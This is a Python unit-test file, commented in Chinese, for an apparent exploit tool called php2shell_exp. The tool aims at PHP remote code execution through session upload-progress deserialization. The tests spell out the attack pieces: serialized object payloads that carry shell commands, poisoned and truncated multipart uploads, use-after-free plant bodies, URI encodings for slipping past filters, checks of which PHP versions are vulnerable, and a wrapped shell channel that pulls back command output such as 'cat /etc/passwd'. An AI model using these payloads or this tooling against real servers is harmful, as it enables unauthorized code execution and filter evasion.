#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""php2shell_exp 轻量自测（纯标准库）：python -m unittest discover -s tests
覆盖：序列化构造 / 变体语义（pipe 必需）/ 判据推导 / 版本面判定 / URI 变形 /
响应解析（多值头·chunked·gzip）/ multipart 截断（在途窗口）/ uaf plant 原语 /
策略表去重。机制依据见 RESEARCH.md。"""

import gzip
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import php2shell_exp as m  # noqa: E402


class TestSerialization(unittest.TestCase):
    def test_php_serialize_object(self):
        self.assertEqual(m.php_serialize_object("Logger", "cmd", "id"),
                         'O:6:"Logger":1:{s:3:"cmd";s:2:"id";}')

    def test_seed_body_plus_len(self):
        body, bnd = m.seed_body("a" * 32, "Logger", "cmd", "id", strategy="plus_len")
        self.assertTrue(bnd.startswith("----WebKitFormBoundary"))
        self.assertIn(b'O:+6:"Logger":1:{', body)

    def test_seed_body_serp_hex(self):
        body, _ = m.seed_body("a" * 32, "Logger", "cmd", "id", strategy="serp_hex")
        self.assertIn(b'O:+6:"Logger":1:{', body)
        self.assertIn(b'S:3:"\\63\\6d\\64";', body)
        self.assertIn(b'S:2:"\\69\\64";', body)


class TestVariantSemantics(unittest.TestCase):
    """公开 PoC 字节级约束：'|' 前缀是对象落到 name|value 的 value 位的必要条件；
    对象后必须留无 '|' 的尾部垃圾强制 decode FAILURE。"""

    def test_variant_list_is_real_only(self):
        self.assertEqual(m.PROGRESS_VALUE_VARIANTS, ["pipe_object", "pipe_clean"])
        self.assertNotIn("bare_object", m.PROGRESS_VALUE_VARIANTS)  # 无 pipe 无法实例化

    def test_pipe_object_carrier(self):
        body, _ = m.seed_body("a" * 32, "Logger", "cmd", "id", variant="pipe_object")
        self.assertIn(b'PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n|O:6:"Logger":1:'
                      b'{s:3:"cmd";s:2:"id";};TRAILING_GARBAGE_FORCE_DECODE_FAIL', body)

    def test_pipe_clean_is_canonical_poc_format(self):
        body, _ = m.seed_body("a" * 32, "Logger", "cmd", "id", variant="pipe_clean")
        self.assertIn(b'\r\n|O:6:"Logger":1:{s:3:"cmd";s:2:"id";}\r\n', body)
        self.assertNotIn(b"TRAILING_GARBAGE", body)

    def test_pipe_present_in_both(self):
        for v in m.PROGRESS_VALUE_VARIANTS:
            body, _ = m.seed_body("a" * 32, "Logger", "cmd", "id", variant=v)
            self.assertIn(b'\r\n|O:6:"Logger"', body)


class TestTruncateMultipart(unittest.TestCase):
    """在途窗口投毒：截断收尾 boundary 之前，解析停在“上传中”，END/cleanup 不触发。"""

    def test_cut_before_closing_delimiter(self):
        body, bnd = m.build_multipart([("PHPSESSID", "s"), ("P", "v")],
                                      file_data=b"B" * 100, boundary="XYZ")
        self.assertIn(b"--XYZ--", body)
        cut = m.truncate_multipart(body, "XYZ")
        self.assertNotIn(b"--XYZ--", cut)
        self.assertIn(b"PHPSESSID", cut)          # 投毒字段保留
        self.assertIn(b"B" * 100, cut)            # 文件分部保留（UPLOAD_START 依赖）
        self.assertTrue(body.startswith(cut.decode("latin-1") if False else cut))

    def test_missing_delimiter_returns_body(self):
        self.assertEqual(m.truncate_multipart(b"abc", "XYZ"), b"abc")


class TestUafPlant(unittest.TestCase):
    def test_fields_and_value(self):
        body, _ = m.uaf_plant_body("a" * 32, "H" * 4096)
        self.assertIn(b"PHPSESSID", body)
        self.assertIn(b"PHP_SESSION_UPLOAD_PROGRESS", body)
        self.assertIn(b"H" * 4096, body)

    def test_carrier_constraints(self):
        # 载体约束（zhaoboy 取证）：progress 值无 '|'、无 CR/LF
        huge = "H" * 64
        self.assertNotIn("|", huge)
        self.assertNotIn("\r", huge)
        self.assertNotIn("\n", huge)

    def test_inject_marker_constraints(self):
        self.assertIn("P2S_INJ_MARK", m.INJECT_MARKER)
        self.assertNotIn("|", m.INJECT_MARKER)
        self.assertNotIn("\r", m.INJECT_MARKER)
        self.assertNotIn("\n", m.INJECT_MARKER)


class TestExpectDerivation(unittest.TestCase):
    def test_echo_with_redirect(self):
        self.assertEqual(m.derive_expect("echo hello word > flag.txt && cat flag.txt"),
                         ["hello word", "word"])

    def test_echo_quoted(self):
        self.assertEqual(m.derive_expect('echo "hello world" > f'),
                         ["hello world", "world"])

    def test_echo_plain(self):
        self.assertEqual(m.derive_expect("echo P2S_ABC"), ["P2S_ABC"])

    def test_non_echo_single_word(self):
        self.assertEqual(m.derive_expect("id"), [])

    def test_non_echo_multi_word(self):
        self.assertEqual(m.derive_expect("cat /etc/passwd"), ["/etc/passwd"])


class TestVersionStatus(unittest.TestCase):
    def test_status_matrix(self):
        self.assertEqual(m.php_version_status(8, 2, 35), "patched")
        self.assertEqual(m.php_version_status(8, 5, 12), "patched")
        self.assertEqual(m.php_version_status(8, 2, 34), "likely_vulnerable")
        self.assertEqual(m.php_version_status(8, 2, None), "branch_only")
        self.assertEqual(m.php_version_status(7, 4, 33), "eol_affected")
        self.assertEqual(m.php_version_status(8, 1, 29), "eol_affected")
        self.assertEqual(m.php_version_status(5, 6, 40), "eol_affected")   # EOL 无官方修复
        self.assertEqual(m.php_version_status(9, 0, 0), "eol_or_unknown")


class TestUriStrategies(unittest.TestCase):
    def setUp(self):
        self.eng = m.BypassEngine(0)

    def test_double_enc_is_true_double(self):
        self.assertEqual(self.eng.uri("/a.b", "uri_double_enc"), "/%2561%252E%2562")

    def test_single_enc(self):
        self.assertEqual(self.eng.uri("/a.b", "uri_enc"), "/%61%2E%62")

    def test_dot_seg_semi_tail(self):
        self.assertEqual(self.eng.uri("/a.b", "uri_dot_seg"), "/a%2eb")
        self.assertEqual(self.eng.uri("/a", "uri_semi"), "/a;x")
        self.assertEqual(self.eng.uri("/a", "uri_tail"), "/a/")

    def test_slash_and_case_and_path_info(self):
        self.assertEqual(self.eng.uri("/a/b", "uri_slash"), "//a//b")
        self.assertEqual(self.eng.uri("/ab", "uri_case"), "/Ab")
        self.assertEqual(self.eng.uri("/x.php", "path_info"), "/x.php/x")
        self.assertEqual(self.eng.uri("/x", "path_info"), "/x/index.php/x")


class TestResponseParsing(unittest.TestCase):
    def test_multi_set_cookie(self):
        raw = (b"HTTP/1.1 200 OK\r\nSet-Cookie: a=1; Path=/\r\nSet-Cookie: b=2; Path=/\r\n"
               b"Content-Length: 2\r\n\r\nhi")
        code, hdrs, body = m.HttpTarget._parse_response(raw)
        self.assertEqual((code, body), (200, b"hi"))
        self.assertEqual(m.split_set_cookie(hdrs["set-cookie"]),
                         ["a=1; Path=/", "b=2; Path=/"])

    def test_chunked(self):
        raw = (b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n"
               b"5\r\nhello\r\n1\r\n!\r\n0\r\n\r\n")
        _, _, body = m.HttpTarget._parse_response(raw)
        self.assertEqual(body, b"hello!")

    def test_gzip(self):
        raw = (b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\r\n"
               + gzip.compress(b"PHP/8.2.34"))
        _, _, body = m.HttpTarget._parse_response(raw)
        self.assertEqual(body, b"PHP/8.2.34")

    def test_100_continue_interim(self):
        raw = (b"HTTP/1.1 100 Continue\r\n\r\nHTTP/1.1 200 OK\r\n"
               b"Content-Length: 2\r\n\r\nok")
        code, _, body = m.HttpTarget._parse_response(raw)
        self.assertEqual((code, body), (200, b"ok"))


class TestShellChannel(unittest.TestCase):
    """稳定 shell 通道：标记限界包装/提取 + 分隔符语义判别。"""

    def test_wrap_sh(self):
        self.assertEqual(m.wrap_shell_cmd("id", ";", "TOK"),
                         "(echo __P2S_B_TOK__;id; echo __P2S_E_TOK__)")

    def test_wrap_cmd_exe(self):
        self.assertEqual(m.wrap_shell_cmd("id", "&", "TOK"),
                         "(echo __P2S_B_TOK__&id& echo __P2S_E_TOK__)")

    def test_wrap_group_captures_stderr(self):
        # 分组使 gadget 自带 ' 2>&1' 作用于整链（中间命令 stderr 不丢失）
        w = m.wrap_shell_cmd("type seed.php", "&", "TOK")
        self.assertTrue(w.startswith("(") and w.endswith(")"))

    def test_extract_between_markers(self):
        body = "noise\n__P2S_B_TOK__\nline1\nline2\n__P2S_E_TOK__\n[api] session started\n"
        self.assertEqual(m.extract_shell_output(body, "TOK"), "line1\nline2")

    def test_extract_missing_or_reversed(self):
        self.assertIsNone(m.extract_shell_output("[api] session started\n", "TOK"))
        self.assertIsNone(m.extract_shell_output("__P2S_E_TOK__x__P2S_B_TOK__", "TOK"))

    def test_literal_semicolon_echo_not_probe_hit(self):
        # cmd.exe 字面回显形态（';' 未被识别为分隔符）不得误判为 probe 成功
        body = "__P2S_B_TOK__; echo P2S_PROBE; __P2S_E_TOK__"
        out = m.extract_shell_output(body, "TOK")
        self.assertIsNotNone(out)
        self.assertNotEqual(out.strip(), "P2S_PROBE")

    def test_clean_fallback(self):
        body = ("<b>Warning</b>: x\nFailed to decode session object. Session has been destroyed\n"
                "__P2S_B_TOK__\nh\n")
        self.assertEqual(m.clean_shell_body(body, "TOK"), "h")


class TestProfiles(unittest.TestCase):
    def test_stacked_union_is_dedup(self):
        self.assertEqual(len(m.ALL_STRATEGIES), len(set(m.ALL_STRATEGIES)))
        self.assertEqual(m.ALL_STRATEGIES, m.BYPASS_PROFILES["stacked"])
        for s in ("plain", "plus_len", "serp_hex", "uri_enc", "uri_double_enc"):
            self.assertIn(s, m.ALL_STRATEGIES)

    def test_no_module_level_leak(self):
        self.assertFalse(hasattr(m, "_seen"))
        self.assertFalse(hasattr(m, "_p"))
        self.assertFalse(hasattr(m, "_s"))

    def test_removed_falsified_machinery(self):
        # 被源码取证证伪的机制不得回流（伪造 delta CALL_ADDR / 裸对象变体）
        for name in ("resolve_call_addr", "forged_zval_fcall", "embed_after_marker",
                     "uaf_arm_body", "KNOWN_DELTAS"):
            self.assertFalse(hasattr(m, name), name)


if __name__ == "__main__":
    unittest.main()
